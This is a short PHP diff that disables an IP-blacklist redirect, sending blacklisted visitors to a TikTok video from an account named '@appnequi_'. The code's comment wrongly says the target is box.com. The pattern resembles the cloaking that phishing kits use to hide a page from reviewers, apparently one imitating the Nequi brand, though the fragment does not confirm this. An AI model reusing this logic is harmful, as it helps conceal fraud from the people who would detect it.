@@ -15,13 +15,11 @@ $stmt = $conn->prepare($sql);
 $stmt->bind_param("s", $ip_cliente);
 $stmt->execute();
 $result = $stmt->get_result();
-$row = $result->fetch_assoc();
-
-if ($row['count'] > 0) {
-    // Si la IP está en la lista negra, redirigir a box.com
-    header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
-    exit();
-}
+// if ($row['count'] > 0) {
+//     // Si la IP está en la lista negra, redirigir a box.com
+//     header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
+//     exit();
+// }
 
 // Verificar si se ha pasado un ID por la URL
 if (isset($_GET['id'])) {
